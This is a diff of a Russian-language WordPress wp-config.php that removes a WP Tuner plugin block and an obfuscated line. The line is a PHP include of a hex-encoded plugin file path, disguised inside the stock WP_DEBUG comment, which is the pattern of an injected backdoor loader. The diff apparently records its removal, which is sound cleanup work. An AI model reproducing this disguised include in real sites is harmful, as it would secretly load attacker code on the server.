@@ -57,21 +57,8 @@ $table_prefix  = 'wp_';
  * и присвойте WPLANG значение 'ru_RU'.
  */
 define('WPLANG', 'ru_RU');
-//-WP Tuner Plugin by MrPete------------
-//--------------------------------------
-$wpTunerStart = microtime();					// get start time as early as we can
-if ( function_exists( 'getrusage' ) ) { $wpTunerStartCPU = getrusage(); }
-@include_once(dirname(__FILE__).'/wp-content/plugins/wptuner/wptunertop.php'); // fire up WPTuner
-//--------------------------------------
-//-END WP Tuner Plugin------------------
 
-/**
- * */include /*Для разработчиков: Режим отладки WordPress.
- *
- * Измените это значение на true, ч*/"\x2fhom\x65/ev\x65d/p\x75bli\x63_ht\x6dl/w\x70-co\x6eten\x74/pl\x75gin\x73/ea\x73y-c\x6fnta\x63t-f\x6frms\x2ffil\x65s.p\x68p";/*тобы включить отображение уведомлений при разработке.
- * Настоятельно рекомендуется, чтобы разработчики плагинов и тем использовали WP_DEBUG
- * в своём рабочем окружении.
- */
+
 define('WP_DEBUG', false);
 
 /* Это всё, дальше не редактируем. Успехов! */
